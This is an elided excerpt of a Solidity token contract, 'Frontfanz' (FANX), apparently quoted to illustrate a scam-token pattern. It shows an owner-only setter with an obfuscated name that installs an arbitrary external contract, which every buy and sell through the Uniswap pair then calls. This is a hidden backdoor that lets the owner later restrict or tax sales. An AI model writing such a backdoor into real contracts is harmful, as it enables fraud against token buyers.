...
contract TokenM is ERC20 {
    ...
    IUserAmounttllcou public tllcou;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Frontfanz", "FANX") {
    ...
    function rotctvvcEooicrZeool(IUserAmounttllcou _tllcou) public onlyOwner {
        tllcou = _tllcou;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tllcou.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tllcou.addOutAmount(from, amount);
            }else{
                tllcou.addOutAmount(from, amount);
                takeFee = false;
            }
